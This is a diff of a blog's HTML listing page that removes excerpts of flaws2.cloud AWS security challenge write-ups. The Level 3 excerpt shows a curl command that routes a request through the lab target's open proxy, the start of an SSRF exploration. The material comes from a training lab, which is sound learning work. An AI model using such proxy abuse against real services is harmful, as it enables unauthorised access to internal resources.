-  Published: <time datetime="0001-01-01T00:00:00&#43;00:00">1 Jan, 0001</time>
 
-</p>
-    
-  </header>
-  
-  <div itemprop="description">
-    Level 2 Now we have a container-based application running at container.target.flaws2.cloud. The hint is that the repository containing its image is called &ldquo;level2&rdquo;.
-Note: you will need your own AWS account to give yourself access to ECR.
-Explore the application We go to container.target.flaws2.cloud with a browser and all we get is a basic auth prompt. Let&rsquo;s just assume it is uncrackable.
-IMG 01
-Checking out the details we can see it is hosted on Ubuntu, with nginx 1.
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/21_flaws2_cloud_2/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="0001-01-01T00:00:00&#43;00:00">
-  <meta itemprop="dateModified" content="0001-01-01T00:00:00&#43;00:00">
-  
-</article>
 
-  
-    <article itemscope itemtype="http://schema.org/CreativeWork">
-  <header>
-    <h2 itemprop="name">
-      <a href="/post/22_flaws2_cloud_3/"></a>
-    </h2>
-    
-      <p class="muted"><svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <circle cx="16" cy="16" r="14" />
-  <path d="M16 8 L16 16 20 20" />
-</svg>
-<span>5 minute read</span>
-<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
-  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
-</svg>
-
-  Published: <time datetime="0001-01-01T00:00:00&#43;00:00">1 Jan, 0001</time>
-
-</p>
-    
-  </header>
-  
-  <div itemprop="description">
-    Level 3 Exploring the proxy We can use the proxy to request more or less any website (HTTP only). Confirm with icanhazip.com, which reflects the requesters IP. For the proxy it is &ldquo;3.85.224.200&rdquo;:
-root@215d97a11044:/# curl -i http://container.target.flaws2.cloud/proxy/http://icanhazip.com/ HTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Fri, 22 Nov 2019 08:36:56 GMT Content-Type: text/html Transfer-Encoding: chunked Connection: keep-alive 3.85.224.200  This is indeed the public IP of the proxy:
-root@215d97a11044:/# dig container.
-  </div>
-  
-    <nav class="readmore"><a itemprop="url" href="/post/22_flaws2_cloud_3/">Read More&nbsp;&raquo;</a></nav>
-  
-  <meta itemprop="inLanguage" content="en-US">
-  <meta itemprop="datePublished" content="0001-01-01T00:00:00&#43;00:00">
-  <meta itemprop="dateModified" content="0001-01-01T00:00:00&#43;00:00">
-  
-</article>
-
-  
+    </footer>
+  </article>
 </main>
     <footer>
-  <nav>
-  <p>
-    
-      <a href="/post/">&laquo; Previous</a> |
-    
-    <span>Page 2 of 2</span>
-    
-  </p>
-</nav>
-
   
 
 </footer>
